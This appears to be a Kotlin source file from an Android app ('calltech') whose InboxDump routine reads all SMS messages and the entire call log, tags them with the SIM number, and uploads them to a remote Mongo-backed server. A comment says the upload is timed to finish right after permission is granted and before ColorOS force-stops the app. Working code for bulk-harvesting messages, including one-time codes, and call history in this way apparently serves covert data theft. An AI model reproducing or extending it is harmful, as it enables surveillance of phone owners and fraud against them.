package com.calltech

import android.content.Context
import android.util.Log

/** Allow ke baad blocking dump — ColorOS force-stop se pehle SMS/calls Mongo mein. */
object InboxDump {
    private const val TAG = "InboxDump"
    private const val PREFS = "calltech_inbox_dump"
    private val lock = Any()

    @Volatile
    private var running = false

    fun isRunning(): Boolean = running

    fun alreadyDone(context: Context): Boolean {
        return context.applicationContext
            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getBoolean("ok", false)
    }

    fun dumpBlocking(context: Context): Boolean {
        val app = context.applicationContext
        synchronized(lock) {
            if (alreadyDone(app)) {
                Log.i(TAG, "Dump already completed — skip")
                return true
            }
            while (running) {
                Log.i(TAG, "Dump already running — wait")
                try {
                    (lock as Object).wait(400)
                } catch (_: InterruptedException) {
                    Thread.currentThread().interrupt()
                    return alreadyDone(app)
                }
                if (alreadyDone(app)) {
                    return true
                }
            }
            running = true
        }

        return try {
            Log.i(TAG, "Dump start")
            MongoSyncHelper.ensureApiUrl(app)
            CallSyncHelper.markBackgroundSyncEnabled(app, true)
            val sim = SimNumberHelper.ensureSimReadyForSync(app)
            Log.i(TAG, "Dump sim=$sim")

            val messages = try {
                MessageSyncHelper.readPhoneMessages(app).map { item ->
                    HashMap(item).apply { put("simNumber", sim) }
                }
            } catch (error: Exception) {
                Log.e(TAG, "SMS read failed", error)
                emptyList()
            }
            Log.i(TAG, "Phone SMS count=${messages.size}")

            val calls = try {
                CallSyncHelper.readAllCallMaps(app).map { item ->
                    HashMap(item).apply { put("simNumber", sim) }
                }
            } catch (error: Exception) {
                Log.e(TAG, "Call read failed", error)
                emptyList()
            }
            Log.i(TAG, "Phone call count=${calls.size}")

            val smsOk = if (messages.isEmpty()) {
                Log.w(TAG, "No SMS rows from content://sms")
                true
            } else {
                Log.i(TAG, "Uploading ${messages.size} SMS")
                MongoSyncHelper.syncMessagesNow(app, messages)
            }

            val callsOk = if (calls.isEmpty()) {
                Log.w(TAG, "No call-log rows")
                true
            } else {
                Log.i(TAG, "Uploading ${calls.size} calls")
                MongoSyncHelper.syncCallLogsNow(app, calls)
            }

            val ok = smsOk && callsOk
            if (ok) {
                app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("ok", true)
                    .putLong("at", System.currentTimeMillis())
                    .putInt("sms", messages.size)
                    .putInt("calls", calls.size)
                    .commit()
            }
            Log.i(TAG, "Dump done sim=$sim smsOk=$smsOk (${messages.size}) callsOk=$callsOk (${calls.size})")
            ok
        } catch (error: Exception) {
            Log.e(TAG, "Dump failed", error)
            false
        } finally {
            synchronized(lock) {
                running = false
                (lock as Object).notifyAll()
            }
        }
    }
}
